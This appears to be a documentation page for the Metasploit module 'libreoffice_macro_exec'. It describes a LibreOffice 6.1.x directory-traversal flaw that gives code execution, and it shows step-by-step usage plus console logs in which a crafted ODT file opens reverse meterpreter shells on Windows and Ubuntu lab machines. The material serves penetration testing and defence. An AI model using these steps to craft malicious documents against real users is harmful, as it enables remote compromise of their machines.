{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/fileformat/libreoffice_macro_exec","result":{"data":{"moduleMetadataJson":{"id":"b190c04f-0a54-5223-804a-06e29749a96a","name":"LibreOffice Macro Code Execution","fullname":"exploit/multi/fileformat/libreoffice_macro_exec","description":"LibreOffice comes bundled with sample macros written in Python and\n        allows the ability to bind program events to them. A macro can be tied\n        to a program event by including the script that contains the macro and\n        the function name to be executed. Additionally, a directory traversal\n        vulnerability exists in the component that references the Python script\n        to be executed. This allows a program event to execute functions from Python\n        scripts relative to the path of the samples macros folder. The pydoc.py script\n        included with LibreOffice contains the tempfilepager function that passes\n        arguments to os.system, allowing RCE.\n\n        This module generates an ODT file with a mouse over event that\n        when triggered, will execute arbitrary code.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/multi/fileformat/libreoffice_macro_exec","documentationSlug":"/modules/documentation/exploit/multi/fileformat/libreoffice_macro_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a directory traversal vulnerability in LibreOffice <code class=\"language-text\">v6.1.0-6.1.2.1</code> that enables remote code execution.\nNote: <code class=\"language-text\">6.0.x</code> and <code class=\"language-text\">6.1.3.x</code> versions are reportedly vulnerable to the directory traversal attack, but are not exploitable by\nthis module due to the lack of ability to pass arguments.</p>\n<p>  LibreOffice comes bundled with sample macros written in Python and allows the ability to bind program events\nto them. A macro can be tied to a program event by including the script that contains the macro and the function\nname to be executed. Additionally, a directory traversal vulnerability exists in the component that references the\nPython script to be executed. This allows a program event to execute functions from Python scripts relative to the\npath of the samples macros folder. The <code class=\"language-text\">pydoc.py</code> script included with LibreOffice contains the <code class=\"language-text\">tempfilepager</code> function\nthat passes arguments to <code class=\"language-text\">os.system</code>, allowing RCE.</p>\n<p>  This module generates an ODT file with a mouse over event that when triggered, will execute arbitrary code.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  LibreOffice <code class=\"language-text\">v6.1.0-6.1.4.1</code>. Vulnerable versions for both Windows and Linux can be found <a href=\"https://downloadarchive.documentfoundation.org/libreoffice/old/\">here</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/fileformat/libreoffice_macro_exec</code></li>\n<li>Do: <code class=\"language-text\">set FILENAME &lt;name&gt;</code></li>\n<li>Do: <code class=\"language-text\">set LHOST &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set LPORT &lt;port&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>Move the generated file to the target</li>\n<li>Start a handler</li>\n<li>Open the file with a vulnerable version of LibreOffice</li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"tested-on-libreoffice-6121-running-windows-7\" style=\"position:relative;\"><a href=\"#tested-on-libreoffice-6121-running-windows-7\" aria-label=\"tested on libreoffice 6121 running windows 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on LibreOffice 6.1.2.1 running Windows 7</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/fileformat/libreoffice_macro_exec \nmsf5 exploit(multi/fileformat/libreoffice_macro_exec) &gt; set lhost 192.168.37.1\nlhost =&gt; 192.168.37.1\nmsf5 exploit(multi/fileformat/libreoffice_macro_exec) &gt; run\n\n[+] librefile.odt stored at /Users/space/.msf4/local/librefile.odt\nmsf5 exploit(multi/fileformat/libreoffice_macro_exec) &gt; use multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.37.1\nlhost =&gt; 192.168.37.1\nmsf5 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 192.168.37.1:4444 \n[*] Sending stage (179779 bytes) to 192.168.37.156\n[*] Meterpreter session 1 opened (192.168.37.1:4444 -&gt; 192.168.37.156:49180) at 2019-04-12 15:14:04 -0500\n\nmeterpreter &gt; getuid\nServer username: WIN-MGMN7ND70I1\\a_user\nmeterpreter &gt; sysinfo\nComputer        : WIN-MGMN7ND70I1\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"tested-on-libreoffice-6101-running-ubuntu-1804\" style=\"position:relative;\"><a href=\"#tested-on-libreoffice-6101-running-ubuntu-1804\" aria-label=\"tested on libreoffice 6101 running ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on LibreOffice 6.1.0.1 running Ubuntu 18.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/fileformat/libreoffice_macro_exec\nmsf5 exploit(multi/fileformat/libreoffice_macro_exec) &gt; set target 1\ntarget =&gt; 1\nmsf5 exploit(multi/fileformat/libreoffice_macro_exec) &gt; set lhost 192.168.37.1\nlhost =&gt; 192.168.37.1\nmsf5 exploit(multi/fileformat/libreoffice_macro_exec) &gt; run\n\n[+] librefile.odt stored at /Users/space/.msf4/local/librefile.odt\nmsf5 exploit(multi/fileformat/libreoffice_macro_exec) &gt; use multi/handler\nmsf5 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set LHOST 192.168.37.1\nLHOST =&gt; 192.168.37.1\nmsf5 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 192.168.37.1:4444\n[*] Sending stage (985320 bytes) to 192.168.37.174\n[*] Meterpreter session 1 opened (192.168.37.1:4444 -&gt; 192.168.37.174:39912) at 2019-04-12 14:50:08 -0500\n\nmeterpreter &gt; getuid\nServer username: uid=1000, gid=1000, euid=1000, egid=1000\nmeterpreter &gt; sysinfo\nComputer     : 192.168.37.174\nOS           : Ubuntu 18.04 (Linux 4.18.0-16-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"b190c04f-0a54-5223-804a-06e29749a96a"}}}